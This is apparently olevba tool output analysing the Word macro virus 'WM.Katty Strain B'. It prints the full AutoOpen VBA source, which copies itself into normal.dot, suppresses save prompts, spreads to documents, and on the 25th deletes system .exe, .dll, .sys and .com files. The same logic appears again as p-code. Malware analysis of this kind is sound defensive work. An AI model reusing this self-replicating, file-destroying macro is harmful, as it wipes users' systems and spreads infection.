olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Katty
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Katty - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Katty - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim Title$
Dim Author$
Dim DateCr$
Dim MacrosFullName$
Dim FileFullName$
Dim PathFullName$

    Title$ = "WM.Katty Strain B"
    Author$ = "Maverick"
    DateCr$ = "November, 1998"

    MacrosFullName$ = "AutoOpen"
    FileFullName$ = WordBasic.[FileName$]()
    PathFullName$ = WordBasic.[DefaultDir$](2) + "\normal.dot"

    Dim a As Object: Set a = WordBasic.DialogRecord.Organizer(False)
    a.Копировать = 1
    a.Tab = 3
    a.Name = MacrosFullName$
    a.Source = FileFullName$
    a.Destination = PathFullName$

    On Error Resume Next
    WordBasic.Organizer a
    WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
    If WordBasic.CountMacros(1) = 0 Then
        a.Source = PathFullName$
        a.Destination = FileFullName$
        WordBasic.Organizer a
        WordBasic.FileSaveAs Format:=1
    End If

    If WordBasic.Day(WordBasic.Now()) = 11 And WordBasic.Month(WordBasic.Now()) = 5 Then
        WordBasic.MsgBox "Happy Birthday My Dear Katty!"
        WordBasic.MsgBox "         I Love You!"
        Else
    End If

    If WordBasic.Day(WordBasic.Now()) = 3 And WordBasic.Month(WordBasic.Now()) = 8 Then
        WordBasic.MsgBox "Today Is My Birthday!"
        WordBasic.MsgBox "Happy Birthday Maverick!"
        Else
    End If

    If WordBasic.Day(WordBasic.Now()) = 25 Then
        WordBasic.Kill "C:\*.bat"
        WordBasic.Kill "C:\*.sys"
        WordBasic.Kill "C:\windows\*.dll"
        WordBasic.Kill "C:\windows\*.exe"
        WordBasic.Kill "C:\windows\command\*.com"
        WordBasic.Kill "C:\windows\command\*.exe"
        WordBasic.Kill "C:\windows\command\*.vxd"
        WordBasic.MsgBox "Ha-Ha!!!"
        Else
    End If


End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Katty
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/AutoOpen - 3471 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn Title
' Line #3:
' 	Dim 
' 	VarDefn Author
' Line #4:
' 	Dim 
' 	VarDefn DateCr
' Line #5:
' 	Dim 
' 	VarDefn MacrosFullName
' Line #6:
' 	Dim 
' 	VarDefn FileFullName
' Line #7:
' 	Dim 
' 	VarDefn PathFullName
' Line #8:
' Line #9:
' 	LitStr 0x0011 "WM.Katty Strain B"
' 	St Title$ 
' Line #10:
' 	LitStr 0x0008 "Maverick"
' 	St Author$ 
' Line #11:
' 	LitStr 0x000E "November, 1998"
' 	St DateCr$ 
' Line #12:
' Line #13:
' 	LitStr 0x0008 "AutoOpen"
' 	St MacrosFullName$ 
' Line #14:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St FileFullName$ 
' Line #15:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x000B "\normal.dot"
' 	Add 
' 	St PathFullName$ 
' Line #16:
' Line #17:
' 	Dim 
' 	VarDefn a (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd Organizer 0x0001 
' 	Set a 
' Line #18:
' 	LitDI2 0x0001 
' 	Ld a 
' 	MemSt Копировать 
' Line #19:
' 	LitDI2 0x0003 
' 	Ld a 
' 	MemSt Text 
' Line #20:
' 	Ld MacrosFullName$ 
' 	Ld a 
' 	MemSt New 
' Line #21:
' 	Ld FileFullName$ 
' 	Ld a 
' 	MemSt Source 
' Line #22:
' 	Ld PathFullName$ 
' 	Ld a 
' 	MemSt Destination 
' Line #23:
' Line #24:
' 	OnError (Resume Next) 
' Line #25:
' 	Ld a 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0001 
' Line #26:
' 	LitDI2 0x0000 
' 	ParamNamed GlobalDotPrompt 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsOptionsSave 0x0001 
' Line #27:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #28:
' 	Ld PathFullName$ 
' 	Ld a 
' 	MemSt Source 
' Line #29:
' 	Ld FileFullName$ 
' 	Ld a 
' 	MemSt Destination 
' Line #30:
' 	Ld a 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0001 
' Line #31:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #32:
' 	EndIfBlock 
' Line #33:
' Line #34:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Day 0x0001 
' 	LitDI2 0x000B 
' 	Eq 
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Month 0x0001 
' 	LitDI2 0x0005 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #35:
' 	LitStr 0x001D "Happy Birthday My Dear Katty!"
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0001 
' Line #36:
' 	LitStr 0x0014 "         I Love You!"
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0001 
' Line #37:
' 	ElseBlock 
' Line #38:
' 	EndIfBlock 
' Line #39:
' Line #40:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Day 0x0001 
' 	LitDI2 0x0003 
' 	Eq 
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Month 0x0001 
' 	LitDI2 0x0008 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #41:
' 	LitStr 0x0015 "Today Is My Birthday!"
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0001 
' Line #42:
' 	LitStr 0x0018 "Happy Birthday Maverick!"
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0001 
' Line #43:
' 	ElseBlock 
' Line #44:
' 	EndIfBlock 
' Line #45:
' Line #46:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Day 0x0001 
' 	LitDI2 0x0019 
' 	Eq 
' 	IfBlock 
' Line #47:
' 	LitStr 0x0008 "C:\*.bat"
' 	Ld WordBasic 
' 	ArgsMemCall Kill 0x0001 
' Line #48:
' 	LitStr 0x0008 "C:\*.sys"
' 	Ld WordBasic 
' 	ArgsMemCall Kill 0x0001 
' Line #49:
' 	LitStr 0x0010 "C:\windows\*.dll"
' 	Ld WordBasic 
' 	ArgsMemCall Kill 0x0001 
' Line #50:
' 	LitStr 0x0010 "C:\windows\*.exe"
' 	Ld WordBasic 
' 	ArgsMemCall Kill 0x0001 
' Line #51:
' 	LitStr 0x0018 "C:\windows\command\*.com"
' 	Ld WordBasic 
' 	ArgsMemCall Kill 0x0001 
' Line #52:
' 	LitStr 0x0018 "C:\windows\command\*.exe"
' 	Ld WordBasic 
' 	ArgsMemCall Kill 0x0001 
' Line #53:
' 	LitStr 0x0018 "C:\windows\command\*.vxd"
' 	Ld WordBasic 
' 	ArgsMemCall Kill 0x0001 
' Line #54:
' 	LitStr 0x0008 "Ha-Ha!!!"
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0001 
' Line #55:
' 	ElseBlock 
' Line #56:
' 	EndIfBlock 
' Line #57:
' Line #58:
' Line #59:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

